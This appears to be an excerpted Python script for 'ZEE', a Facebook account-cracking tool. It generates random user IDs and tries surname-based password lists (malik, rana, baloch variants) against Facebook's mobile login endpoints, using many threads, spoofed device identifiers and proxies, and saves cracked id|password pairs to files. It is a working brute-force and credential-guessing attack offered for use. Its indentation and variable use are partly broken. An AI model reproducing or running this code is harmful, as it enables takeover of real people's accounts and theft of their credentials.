...
def menu():
			...
			if zee in ['1','01']:
				...
				try:
					...
					linex()
					ps_limit = int(input(' Putt pass limit : '))
				except:
					ps_limit =1
				os.system('clear')
				print(logo)
				...
				with tred(max_workers=25) as crack_submit:
					...
					print(' \x1b[1;91mIf show no result use flight mode')
					linex()
					for user in fo:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[ZEE-CP] '+ids+' | '+pas+'\33[0;97m')
...
def zee1():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] Last 7 Digit Method \x1b[1;92m[1]')
	print('\x1b[1;97m[2] Random Khan Method \x1b[1;92m[2]')
	print('\x1b[1;97m[3] Pak Malik Method \x1b[1;92m[3]')
	print('\x1b[1;97m[4] Pak Rana Method \x1b[1;92m[4]')
	print('\x1b[1;97m[5] Pak Baloch Method \x1b[1;92m[5]')
...
def random_number3():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'malik786','malik44','malik12','malik1122']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def random_number4():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'rana12345','janjan','rana123','rana1122','rana12']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def random_number5():
	...
	linex()
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Your Idz limit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'baloch','baloch12','baloch12','baloch12345','baloch12345']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example : khan12345,baloch,***Etc')
    linex()
...
def ffb(ids,names,passlist):
        ...
        try:
			...
			getlog = requests.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = requests.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
			Aking=requests.cookies.get_dict().keys()
                        if "c_user" in yaari:
                                print('\r\r\033[1;32m [ZEE-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ZEE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in yaari:
                                if 'y' in pcp:
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ZEE-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def mmm(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ZEE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZEE-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [ZEE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZEE-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
